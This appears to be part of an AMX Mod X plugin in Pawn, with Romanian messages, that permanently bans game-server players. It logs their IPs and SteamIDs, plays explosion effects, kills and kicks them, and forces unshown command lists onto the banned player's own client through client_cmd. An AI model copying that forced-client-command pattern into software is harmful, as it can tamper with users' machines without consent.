		copy( EliminatedName[ i ], sizeof ( EliminatedName[ ] ) -1, "" );
		copy( EliminatedIp[ i ], sizeof ( EliminatedIp[ ] ) -1, "" );
		copy( EliminatedSteamId[ i ], sizeof ( EliminatedSteamId[ ] ) -1, "" );
		copy( EliminatedAdminName[ i ], sizeof ( EliminatedAdminName[ ] ) -1, "" );
		copy( EliminatedAdminIp[ i ], sizeof ( EliminatedAdminIp[ ] ) -1, "" );
		copy( EliminatedAdminSteamId[ i ], sizeof ( EliminatedAdminSteamId[ ] ) -1, "" );
		copy( EliminatedReason[ i ], sizeof ( EliminatedReason[ ] ) -1, "" );
		
	}
	
	if( id == 0 )
	{
		server_print( "Eliminarile vor fi reincarcate !" );
	}
	else
	{
		client_cmd( id, "echo Eliminarile vor fi reincarcate !" );
	}
	
	LoadEliminates( );
	
	if( id == 0 )
	{
		server_print( "Am incarcat cu succes %d eliminari.", Eliminates );
	}
	
	else
	{
		client_cmd( id, "echo Am incarcat cu succes %d eliminari.", Eliminates );
	}
	
	return 1;
}

public EliminateUser( id, Player, const reason[ ] )
{
	if( Eliminates >= EliminatesNum )
	{
		Log( "[EROARE] - EliminateList FULL  ( %d / %d ) !", Eliminates, EliminatesNum );
		return 1;	
	}
	
	
	new file[ 128 ], log[ 256 ];
	get_configsdir( file, sizeof ( file ) -1 );
	formatex( file, sizeof ( file ) -1,"%s/%s", file, EliminateDataFile );
	
	if( !file_exists( file ) )
	{
		write_file( file ,";Ip-urile / Steamid-urile userilor eliminati permanent !", -1 );
		write_file( file ,";",-1);
		write_file( file ,";",-1);
	}	
	
	formatex( log, sizeof (log ) -1,"^"%s^" ^"%s^" ^"%s^" ^"%s^" ^"%s^" ^"%s^" ^"%s^" ^"%s^"",
		_get_time( ), get_name( Player ), get_ip( Player ), get_authid( Player ),
		get_name( id ), get_ip( id ), get_authid( id ), reason );
		
	write_file( file, log, -1 );
	
	LoadEliminates( );
	
	
	set_task( 0.7, "ExecFirstEliminateCommands", Player + ELIMINATETASK );
	set_task( 0.9, "ExecSecondEliminateCommands", Player + ELIMINATETASK );
	
	return 0;
	
}

public ExecFirstEliminateCommands( id )
{
	id -= ELIMINATETASK;
	if( !is_user_connected( id ) ) return 1;
	
	for( new i = 0; i < sizeof( FirstEliminateCommands ) ; i++ )
	{
		client_cmd( id, "%s", FirstEliminateCommands[ i ] );
	}
	
	return 0;
}

public ExecSecondEliminateCommands( id )
{
	id -= ELIMINATETASK;
	if( !is_user_connected( id ) ) return 1;
	
	for( new i = 0; i < sizeof( SecondEliminateCommands ) ; i++ )
	{
		client_cmd( id, "%s", SecondEliminateCommands[ i ] );
	}
	
	return 0;
}

/*======================================= - ¦ Askhanar ¦ - =======================================*/

public LoadEliminates( )
{
	
	new file[ 128 ];
	get_configsdir( file, sizeof ( file ) -1 );
	formatex( file, sizeof ( file ) -1,"%s/%s", file, EliminateDataFile );
	
	if( !file_exists( file ) ) 
	{
		Log( "[EROARE] - Nu am gasit %s ", file );
		Log( "[EROARE] - Creez un nou fisier." );
		
		write_file( file ,";Ip-urile / Steamid-urile userilor eliminati permanent !", -1 );
		write_file( file ,";",-1);
		write_file( file ,";",-1);
	}
	
	new f = fopen( file, "rt" );
	
	if( !f ) return 0;
	
	new data[ 512 ], buffer[ 8 ][ 64 ] ;
	
	while( !feof( f ) && Eliminates < EliminatesNum ) 
	{
		fgets( f, data, sizeof ( data ) -1 );
		
		if( !data[ 0 ] || data[ 0 ] == ';' || ( data[ 0 ] == '/' && data[ 1 ] == '/' ) ) 
			continue;
		
		parse(data,\
		buffer[ 0 ], sizeof ( buffer[ ] ) - 1,\
		buffer[ 1 ], sizeof ( buffer[ ] ) - 1,\
		buffer[ 2 ], sizeof ( buffer[ ] ) - 1,\
		buffer[ 3 ], sizeof ( buffer[ ] ) - 1,\
		buffer[ 4 ], sizeof ( buffer[ ] ) - 1,\
		buffer[ 5 ], sizeof ( buffer[ ] ) - 1,\
		buffer[ 6 ], sizeof ( buffer[ ] ) - 1,\
		buffer[ 7 ], sizeof ( buffer[ ] ) - 1
		);
		
		copy( EliminatedTime[ Eliminates ], sizeof ( EliminatedTime[ ] ) -1, buffer[ 0 ] );
		copy( EliminatedName[ Eliminates ], sizeof ( EliminatedName[ ] ) -1, buffer[ 1 ] );
		copy( EliminatedIp[ Eliminates ], sizeof ( EliminatedIp[ ] ) -1, buffer[ 2 ] );
		copy( EliminatedSteamId[ Eliminates ], sizeof ( EliminatedSteamId[ ] ) -1, buffer[ 3 ] );
		copy( EliminatedAdminName[ Eliminates ], sizeof ( EliminatedAdminName[ ] ) -1, buffer[ 4 ] );
		copy( EliminatedAdminIp[ Eliminates ], sizeof ( EliminatedAdminIp[ ] ) -1, buffer[ 5 ] );
		copy( EliminatedAdminSteamId[ Eliminates ], sizeof ( EliminatedAdminSteamId[ ] ) -1, buffer[ 6 ] );
		copy( EliminatedReason[ Eliminates ], sizeof ( EliminatedReason[ ] ) -1, buffer[ 7 ] );
		
		Eliminates++;
	}
	
	fclose( f );
	
	Log( "[INFO] - Am incarcat cu succes %d eliminari din %s", Eliminates, file );
	
	return 0;
}

public RemoveEliminate( i )
{
	for( new x = i ; x < Eliminates ; x++ )
	{
		if( x + 1 == EliminatesNum )
		{
			copy( EliminatedTime[ x ], sizeof ( EliminatedTime[ ] ) -1, "" );
			copy( EliminatedName[ x ], sizeof ( EliminatedName[ ] ) -1, "" );
			copy( EliminatedIp[ x ], sizeof ( EliminatedIp[ ] ) -1, "" );
			copy( EliminatedSteamId[ x ], sizeof ( EliminatedSteamId[ ] ) -1, "" );
			copy( EliminatedAdminName[ x ], sizeof ( EliminatedAdminName[ ] ) -1, "" );
			copy( EliminatedAdminIp[ x ], sizeof ( EliminatedAdminIp[ ] ) -1, "" );
			copy( EliminatedAdminSteamId[ x ], sizeof ( EliminatedAdminSteamId[ ] ) -1, "" );
			copy( EliminatedReason[ x ], sizeof ( EliminatedReason[ ] ) -1, "" );
			
		}
		else
		{
			copy( EliminatedTime[ x ], sizeof ( EliminatedTime[ ] ) -1, EliminatedTime[ x + 1 ] );
			copy( EliminatedName[ x ], sizeof ( EliminatedName[ ] ) -1, EliminatedName[ x + 1 ] );
			copy( EliminatedIp[ x ], sizeof ( EliminatedIp[ ] ) -1, EliminatedIp[ x + 1 ] );
			copy( EliminatedSteamId[ x ], sizeof ( EliminatedSteamId[ ] ) -1, EliminatedSteamId[ x + 1 ] );
			copy( EliminatedAdminName[ x ], sizeof ( EliminatedAdminName[ ] ) -1, EliminatedAdminName[ x + 1 ] );
			copy( EliminatedAdminIp[ x ], sizeof ( EliminatedAdminIp[ ] ) -1, EliminatedAdminIp[ x + 1 ] );
			copy( EliminatedAdminSteamId[ x ], sizeof ( EliminatedAdminSteamId[ ] ) -1, EliminatedAdminSteamId[ x + 1 ] );
			copy( EliminatedReason[ x ], sizeof ( EliminatedReason[ ] ) -1, EliminatedReason[ x + 1 ] );
		}
	}
	
	Eliminates--;
	
	ReWriteEliminations( );
}

/*======================================= - ¦ Askhanar ¦ - =======================================*/

public ReWriteEliminations( )
{
	new file[ 128 ];
	get_configsdir( file, sizeof ( file ) -1 );
	formatex( file, sizeof ( file ) -1,"%s/%s", file, EliminateDataFile );
	
	new f = fopen( file, "wt" );
	
	fprintf( f, ";Ip-urile / Steamid-urile userilor eliminati permanent !^n" );
	fprintf( f, ";^n" );
	fprintf( f, ";^n" );
	
	static EliminateTime[ 32 ], EliminateName[ 32 ], EliminateIp[ 32 ], EliminateSteamId[ 35 ];
	static EliminateAdminName[ 32 ], EliminateAdminIp[ 32 ], EliminateAdminSteamId[ 35 ], EliminateReason[ 32 ];
	
	for( new i = 0 ; i < Eliminates ; i++ )
	{
		
		copy( EliminateTime, sizeof ( EliminateTime ) -1, EliminatedTime[ i ] );
		copy( EliminateName , sizeof ( EliminateName ) - 1, EliminatedName[ i ] );
		copy( EliminateIp , sizeof ( EliminateIp ) - 1, EliminatedIp[ i ] );
		copy( EliminateSteamId , sizeof ( EliminateSteamId ) - 1, EliminatedSteamId[ i ] );
		copy( EliminateAdminName , sizeof ( EliminateAdminName ) - 1, EliminatedAdminName[ i ] );
		copy( EliminateAdminIp , sizeof ( EliminateAdminIp ) - 1, EliminatedAdminIp[ i ] );
		copy( EliminateAdminSteamId , sizeof ( EliminateAdminSteamId ) - 1, EliminatedAdminSteamId[ i ] );
		copy( EliminateReason , sizeof ( EliminateReason ) - 1, EliminatedReason[ i ] );
		
		fprintf( f, "^"%s^" ^"%s^" ^"%s^" ^"%s^" ^"%s^" ^"%s^" ^"%s^" ^"%s^"^n",\
		EliminateTime,\
		EliminateName,\
		EliminateIp,\
		EliminateSteamId,\
		EliminateAdminName,\
		EliminateAdminIp,\
		EliminateAdminSteamId,\
		EliminateReason
		);
	}
	
	fclose(f);
}

public LogToConfigs( const msg[ ], any:...)
{
	new message[ 256 ];
	vformat( message, sizeof ( message ) -1, msg , 2 );
	
	new file[ 128 ], log[ 256 ];
	get_configsdir( file, sizeof ( file ) -1 );
	formatex( file, sizeof ( file ) -1,"%s/%s", file, EliminateLogFile );
	
	if( !file_exists( file ) ) 
	{
		write_file( file ,"In acest log veti gasi urmatoarele informatii:", -1 );
		write_file( file ,"Cine, cand si cui a dat eliminate dar si pe ce motiv.",-1 );
		write_file( file ,"Cine, cand si cui a scos eliminarea dar si pe ce motiv.",-1 );
		write_file( file ,"",-1 );
		write_file( file ,"",-1 );
	}	
	
	formatex( log, sizeof (log ) -1,"|%s| - %s ", _get_time( ), message );
	write_file( file, log, -1 );

}

/*======================================= - ¦ Askhanar ¦ - =======================================*/

public Log( const msg[ ], any:...)
{
	new message[ 256 ];
	vformat( message, sizeof ( message ) -1, msg , 2 );
	
	new dir[ 64 ], file[ 128 ], log[ 256 ];	
	
	if( !dir[ 0 ] )
	{	
		get_basedir( dir, sizeof ( dir ) -1 );
		formatex( file, sizeof ( file ) -1,"%s/logs/AdvancedEliminate.log", dir );
	}
	
	formatex( log, sizeof (log ) -1,"|%s| %s ", _get_time( ), message );
	write_file( file, log, -1 );
}

/*======================================= - ¦ Askhanar ¦ - =======================================*/

public PrintConsoleInfo( id, const name[ ], const ip[ ], const steamid[ ], const reason[ ], const admin_name[ ], const admin_ip[ ], const admin_steamid[ ], const dateandtime[ ] )
{
	new plugin_info[ 128 ];
	formatex( plugin_info, sizeof ( plugin_info ) -1,"echo ^"*********** %s v%s by %s ************^"", PLUGIN, VERSION, "Askhanar");
	
	client_cmd( id, "echo ^"****************************************************^"") ;
	client_cmd( id, "echo ^"***************Informatii despre eliminarea de pe server*********^"" );
	client_cmd( id, "echo ^"*    ^"" );
	client_cmd( id, "echo ^"*    Nume: %s^"", name );
	client_cmd( id, "echo ^"*    Ip: %s^"", ip );
	client_cmd( id, "echo ^"*    Steamid: %s^"", steamid );
	client_cmd( id, "echo ^"*    Motiv: %s ^"", reason );
	client_cmd( id, "echo ^"*    Durata: Permanenta^"" );
	client_cmd( id, "echo ^"*    Nume Admin: %s^"", admin_name );
	client_cmd( id, "echo ^"*    Ip Admin: %s^"", admin_ip );
	client_cmd( id, "echo ^"*    Steamid Admin: %s^"", admin_steamid );
	client_cmd( id, "echo ^"*    Data/Ora: %s^"", dateandtime );
	client_cmd( id, "echo ^"*    Daca te simti neindreptatit contacteaza-ne pe:^"");
	client_cmd( id, "echo ^"*    %s^"", get_site( ) );
	client_cmd( id, "echo ^"*    ^"" );
	client_cmd( id, "echo ^"****************************************************^"") ;
	client_cmd( id, "%s", plugin_info );
	client_cmd( id, "echo ^"****************************************************^"") ;
}

/*======================================= - ¦ Askhanar ¦ - =======================================*/
/*======================================= - ¦ Askhanar ¦ - =======================================*/

public TaskDisconnectPlayer( id )
{
	
	id -= ELIMINATETASK;
	server_cmd( "kick #%i ^"Ai fost eliminat de pe acest server, verifica-ti consola !^"", get_user_userid( id ) );
	
}
public TaskDisconnectPlayerFromSV( id )
{
	id -= ELIMINATETASK;
	if( !is_user_connected( id ) ) return 1;
	
	server_cmd( "kick #%i ^"Ai fost eliminat de pe acest server, verifica-ti consola !^"", get_user_userid( id ) );
	
	return 1;
}

public CreateEliminateEffects( id )
{
	id -= ELIMINATETASK;
	if( !is_user_connected( id ) ) return 1;
	
	get_user_origin( id, vOrigin[ id ] );
	
	Create_TE_IMPLOSION( vOrigin[ id ], 100, 20, 5 );
	emit_sound( id, CHAN_STATIC, EliminateExplodeSound, 1.0, ATTN_NORM, 0, PITCH_NORM );
	
	
	set_task( 0.5, "CreateExplosionEffect", id + ELIMINATETASK );
	set_task( 0.5, "CreateBlastCirclesEffect", id + ELIMINATETASK );
	
	return 0;
}

public CreateExplosionEffect( id )
{
	id -= ELIMINATETASK;
	
	if( !is_user_connected( id ) ) return 1;
	
	new Origin[ 3 ],vPosition[ 3 ];
	Origin[ 0 ] = vOrigin[ id ][ 0 ];
	Origin[ 1 ] = vOrigin[ id ][ 1 ];
	Origin[ 2 ] = vOrigin[ id ][ 2 ];
	
	vPosition[ 0 ] = vOrigin[ id ][ 0 ] + random_num( -100, 100 );
	vPosition[ 1 ] = vOrigin[ id ][ 1 ] + random_num( -100, 100 );
	vPosition[ 2 ] = vOrigin[ id ][ 2 ] + random_num( -50, 50 );
	
	Create_TE_EXPLOSION( Origin, vPosition, ExplodeSpr, (random_num(0,20) + 20), 12, 0 );
	Create_TE_Smoke( Origin, vPosition, SmokeSpr, 60, 10 );
	user_silentkill( id );
	
	return 0;
	
}

public CreateBlastCirclesEffect( id )
{
	id -= ELIMINATETASK;
	
	if( !is_user_connected( id ) ) return 1;
	
	new Origin[ 3], vPosition[3];

	Origin[ 0 ] = vOrigin[ id ][ 0 ];
	Origin[ 1 ] = vOrigin[ id ][ 1 ];
	Origin[ 2 ] = vOrigin[ id ][ 2 ] - 16;

	vPosition[ 0 ] = vOrigin[ id ][ 0];
	vPosition[ 1 ] = vOrigin[ id ][ 1 ];
	vPosition[ 2 ] = vOrigin[ id ][ 2 ] + 250;

	Create_TE_BEAMCYLINDER( Origin, Origin, vPosition, ShockWaveSpr, 0, 0, 6, 16, 0, 188, 220, 255, 255, 0 );

	vOrigin[id][ 2 ] = ( Origin[2] - 250 ) + ( 250 / 2 );

	Create_TE_BEAMCYLINDER( Origin, Origin, vPosition, ShockWaveSpr, 0, 0, 6, 16, 0, 188, 220, 255, 255, 0 );
	
	return 0;
}
stock Create_TE_IMPLOSION( position[ 3 ], radius, count, life )
{

	message_begin( MSG_BROADCAST, SVC_TEMPENTITY );
	write_byte ( TE_IMPLOSION );
	write_coord( position[ 0 ] );			// position (X)
	write_coord( position[ 1 ] );			// position (Y)
	write_coord( position[ 2 ] );			// position (Z)
	write_byte ( radius );				// radius
	write_byte ( count );				// count
	write_byte ( life );					// life in 0.1's
	message_end( );
}

stock Create_TE_EXPLOSION( origin[ 3 ], origin2[ 3 ], iSprite, scale, frameRate, flags )
{

	message_begin( MSG_PVS, SVC_TEMPENTITY, origin );
	write_byte( TE_EXPLOSION );
	write_coord( origin2[ 0 ] );			// position (X)
	write_coord( origin2[ 1 ] );			// position (Y)
	write_coord( origin2[ 2 ]	);			// position (Z)
	write_short( iSprite );			// sprite index
	write_byte( scale );				// scale in 0.1's
	write_byte( frameRate );				// framerate
	write_byte( flags );					// flags
	message_end( );
}

stock Create_TE_Smoke( originSight[ 3 ], position[ 3 ], iSprite, scale, framerate )
{

	message_begin( MSG_PVS, SVC_TEMPENTITY, originSight );
	write_byte( TE_SMOKE );
	write_coord( position[ 0 ] );			// Position
	write_coord( position[ 1 ] );
	write_coord( position[ 2 ] );
	write_short( iSprite );				// Sprite index
	write_byte( scale );					// scale * 10
	write_byte( framerate  );		// framerate
	message_end( );
}



stock Create_TE_BEAMCYLINDER( origin[ 3 ], center[ 3 ], axis[ 3 ], iSprite, startFrame, frameRate, life, width, amplitude, red, green, blue, brightness, speed )
{

	message_begin( MSG_PAS, SVC_TEMPENTITY, origin );
	write_byte( TE_BEAMCYLINDER );
	write_coord( center[ 0 ] );			// center position (X)
	write_coord( center[ 1 ] );			// center position (Y)
	write_coord( center[ 2 ] );			// center position (Z)
	write_coord( axis[ 0 ] );				// axis and radius (X)
	write_coord( axis[ 1 ] );				// axis and radius (Y)
	write_coord( axis[ 2 ] );				// axis and radius (Z)
	write_short( iSprite );				// sprite index
	write_byte( startFrame );			// starting frame
	write_byte( frameRate );				// frame rate in 0.1's
	write_byte( life );					// life in 0.1's
	write_byte( width );					// line width in 0.1's
	write_byte( amplitude )	;			// noise amplitude in 0.01's
	write_byte( red );					// color (red)
	write_byte( green );					// color (green)
	write_byte( blue );				// color (blue)
	write_byte( brightness );			// brightness
	write_byte( speed );					// scroll speed in 0.1's
	message_end( );
}

/*======================================= - ¦ Askhanar ¦ - =======================================*/

stock get_name( id )
{
	new name[ 32 ];
	get_user_name( id, name, sizeof ( name ) -1 );

	return name;
}

stock get_ip( id )
{
	new ip[ 32 ];
	get_user_ip( id, ip, sizeof ( ip ) -1, 1 );

	return ip;
}

stock get_authid( id )
{
	new authid[ 35 ];
	get_user_authid( id, authid, sizeof ( authid ) -1 );

	return authid;
}

/*======================================= - ¦ Askhanar ¦ - =======================================*/

stock get_tag( )
{
	new tag[ 32 ];
	get_pcvar_string( cvar_tag, tag, sizeof ( tag ) -1 );

	return tag;
}

stock get_site( )
{
	new site[ 32 ];
	get_pcvar_string( cvar_site, site, sizeof ( site ) -1 );

	return site;
}
stock _get_time( )
{
	new logtime[ 32 ];
	get_time("%d.%m.%Y - %H:%M:%S", logtime ,sizeof ( logtime ) -1 );
	
	return logtime;
}

/*======================================= - ¦ Askhanar ¦ - =======================================*/

stock bool:HasUserAccess( id )
{
	if( get_user_flags( id ) & ELIMINATE_ACCESS )
		return true;
		
	return false;
}

public ShakeScreen( id, const Float:seconds )
{
	message_begin( MSG_ONE, get_user_msgid( "ScreenShake" ), { 0, 0, 0 }, id );
	write_short( floatround( 4096.0 * seconds, floatround_round ) );
	write_short( floatround( 4096.0 * seconds, floatround_round ) );
	write_short( 1<<13 );
	message_end( );
	
}

public FadeScreen( id, const Float:seconds, const red, const green, const blue, const alpha )
{      
	message_begin( MSG_ONE, get_user_msgid( "ScreenFade" ), _, id );
	write_short( floatround( 4096.0 * seconds, floatround_round ) );
	write_short( floatround( 4096.0 * seconds, floatround_round ) );
	write_short( 0x0000 );
	write_byte( red );
	write_byte( green );
	write_byte( blue );
	write_byte( alpha );
	message_end( );

}
/*======================================= - ¦ Askhanar ¦ - =======================================*/

/* AMXX-Studio Notes - DO NOT MODIFY BELOW HERE
*{\\ rtf1\\ ansi\\ deff0{\\ fonttbl{\\ f0\\ fnil Tahoma;}}\n\\ viewkind4\\ uc1\\ pard\\ lang1033\\ f0\\ fs16 \n\\ par }
*/